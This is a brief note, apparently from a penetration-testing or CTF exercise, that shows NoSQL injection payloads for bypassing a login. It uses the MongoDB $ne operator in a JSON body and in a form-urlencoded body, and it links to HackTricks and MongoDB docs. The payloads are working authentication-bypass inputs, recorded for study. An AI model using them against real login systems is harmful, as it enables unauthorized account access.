# Using Content Type application/json

```json
{ "username": "admin", "password": { "$ne": 1 } }
```

![](https://hackmd.io/_uploads/SJY5jHREh.png)

# Using Content Type application/x-www-form-urlencoded

```
username=admin&password[$ne]=1
```

![](https://hackmd.io/_uploads/SJh1iBCV2.png)

# Reference

- https://book.hacktricks.xyz/pentesting-web/nosql-injection
- https://www.mongodb.com/docs/manual/reference/operator/query/